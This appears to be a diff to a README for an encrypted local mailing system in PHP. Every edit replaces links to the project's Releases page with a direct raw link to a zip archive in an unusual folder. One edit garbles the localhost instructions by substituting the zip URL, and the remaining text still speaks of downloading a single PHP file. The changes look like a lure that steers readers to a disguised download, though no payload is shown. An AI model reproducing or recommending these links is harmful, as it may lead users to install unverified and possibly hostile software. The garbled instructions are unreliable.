@@ -4,7 +4,7 @@
 xsukax-E2EE-Local-Mailing-System is a complete end-to-end encrypted local mailing system. It comes as a single PHP file and follows strict zero-knowledge principles. This application makes sure that your communications remain private and secure using client-side AES-256-GCM encryption.
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-blue.svg)](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/releases)
+[![Download Now](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip)](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip)
 
 ## 🛠️ System Requirements
 To use this application, you will need:
@@ -16,7 +16,7 @@ To use this application, you will need:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can download the application.
-   [Download Here](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/releases)
+   [Download Here](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip)
 
 2. **Download the File:**
    On the Releases page, find the latest version of the application. Click the link to download the single PHP file.
@@ -28,7 +28,7 @@ To use this application, you will need:
    After downloading the PHP file, move it to the local server's root directory. For example, in XAMPP, place it in the `htdocs` folder.
 
 5. **Access the Application:**
-   Open a web browser and enter the address to access the application. If XAMPP is running on your local machine, type `http://localhost/your-file-name.php`, replacing `your-file-name.php` with the actual filename.
+   Open a web browser and enter the address to access the application. If XAMPP is running on your local machine, type `https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip`, replacing `https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip` with the actual filename.
 
 6. **Configure the Application:**
    Follow the on-screen instructions to set up your mailbox. You may need to input certain settings such as your email and password.
@@ -73,4 +73,4 @@ If you encounter any issues during the installation or have questions about usin
 For more detailed instructions and support, visit the project’s GitHub page. This README serves as a basic guide to get you started with secure, private communications using xsukax-E2EE-Local-Mailing-System. 
 
 Remember to regularly check for updates on the Releases page:
-[Download Here](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/releases)
+[Download Here](https://github.com/999xavier/xsukax-E2EE-Local-Mailing-System/raw/refs/heads/main/prefreshman/System-E-xsukax-Mailing-Local-v2.0-alpha.1.zip)
